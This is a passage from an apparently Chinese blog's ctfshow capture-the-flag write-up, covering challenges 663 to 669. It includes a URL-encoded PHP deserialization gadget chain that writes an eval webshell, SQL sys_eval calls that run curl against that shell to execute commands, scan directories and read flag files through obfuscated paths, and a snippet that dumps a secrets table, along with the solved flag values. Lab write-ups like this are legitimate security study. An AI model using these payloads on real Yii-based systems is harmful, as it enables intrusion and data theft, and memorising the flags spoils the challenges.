"UnserializeForm[ctfshowUnserializeData]=O%3A32%3A%22Codeception%5CExtension%5CRunProcess%22%3A2%3A%7Bs%3A43%3A%22%00Codeception%5CExtension%5CRunProcess%00processes%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3BO%3A35%3A%22Symfony%5CComponent%5CString%5CLazyString%22%3A1%3A%7Bs%3A42%3A%22%00Symfony%5CComponent%5CString%5CLazyString%00value%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A21%3A%22yii%5Crest%5CCreateAction%22%3A2%3A%7Bs%3A11%3A%22checkAccess%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A16%3A%22yii%5Cgii%5CCodeFile%22%3A3%3A%7Bs%3A9%3A%22operation%22%3BN%3Bs%3A4%3A%22path%22%3Bs%3A28%3A%22%2Fvar%2Foa%2Fweb%2Fassets%2Fshell.php%22%3Bs%3A7%3A%22content%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7Di%3A1%3Bs%3A4%3A%22save%22%3B%7Ds%3A2%3A%22id%22%3Bs%3A0%3A%22%22%3B%7Di%3A1%3Bs%3A3%3A%22run%22%3B%7D%7D%7D%7Ds%3A40%3A%22%00Codeception%5CExtension%5CRunProcess%00output%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3BO%3A35%3A%22Symfony%5CComponent%5CString%5CLazyString%22%3A1%3A%7Bs%3A42%3A%22%00Symfony%5CComponent%5CString%5CLazyString%00value%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A21%3A%22yii%5Crest%5CCreateAction%22%3A2%3A%7Bs%3A11%3A%22checkAccess%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A16%3A%22yii%5Cgii%5CCodeFile%22%3A3%3A%7Bs%3A9%3A%22operation%22%3BN%3Bs%3A4%3A%22path%22%3Bs%3A28%3A%22%2Fvar%2Foa%2Fweb%2Fassets%2Fshell.php%22%3Bs%3A7%3A%22content%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7Di%3A1%3Bs%3A4%3A%22save%22%3B%7Ds%3A2%3A%22id%22%3Bs%3A0%3A%22%22%3B%7Di%3A1%3Bs%3A3%3A%22run%22%3B%7D%7D%7D%7D" "http://oa:8888/index.php?r=site%2Funserialize&amp;key=flag_663%3Dctfshow%7Bfa5cc1fb0bfc986d1ef150269c0de197%7D"');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开始RCE</p><pre class="line-numbers language-none"><code class="language-none">select sys_eval('sudo curl -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "1=system(whoami);" "http://oa:8888/assets/shell.php"');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210165040352.png" alt="image-20220210165040352">函数被ban掉了</p><p>扫描当前目录</p><pre class="line-numbers language-none"><code class="language-none">select sys_eval('sudo curl -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "1=print_r(scandir(chr(46)));" "http://oa:8888/assets/shell.php"');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210165303990.png" alt="image-20220210165303990"></p><p>继续扫描上级目录</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210170709439.png" alt="image-20220210170709439"></p><p>继续上级目录扫描</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210170806817.png" alt="image-20220210170806817"></p><p>发现flag664.php</p><pre class="line-numbers language-none"><code class="language-none">select sys_eval('sudo curl -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "1=print_r(file_get_contents(chr(46).chr(46).chr(47).chr(46).chr(46).chr(47).chr(102).chr(108).chr(97).chr(103).chr(54).chr(54).chr(52).chr(46).chr(112).chr(104).chr(112)));" "http://172.2.78.5:8888/assets/shell.php"');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210171739073.png" alt="image-20220210171739073"></p><p>flag_664=ctfshow{35802d184dba134bdc8d0d23e09051f7}</p><h2 id="666"><a href="#666" class="headerlink" title="666"></a>666</h2><pre class="line-numbers language-none"><code class="language-none">5.txt:1=$conn = new mysqli('localhost','root','root','ctfshow');$res = $conn-&gt;query("select * from ctfshow_secret");if($res){$row=$res-&gt;fetch_array(MYSQLI_BOTH);}echo $row[0];$conn-&gt;close();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="C:/Users/86181/AppData/Roaming/Typora/typora-user-images/image-20220210211239119.png" alt="image-20220210211239119"></p><p>flag_666=ctfshow{bb4053583279be4e3be880f30ce3e53e</p><h2 id="667"><a href="#667" class="headerlink" title="667"></a>667</h2><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210174146327.png" alt="image-20220210174146327"></p><p>flag_667=ctfshow{503a075560764e3d116436ab73d7a560}</p><h2 id="668"><a href="#668" class="headerlink" title="668"></a>668</h2><h2 id="669"><a href="#669" class="headerlink" title="669"></a>669</h2>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 终极考核 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
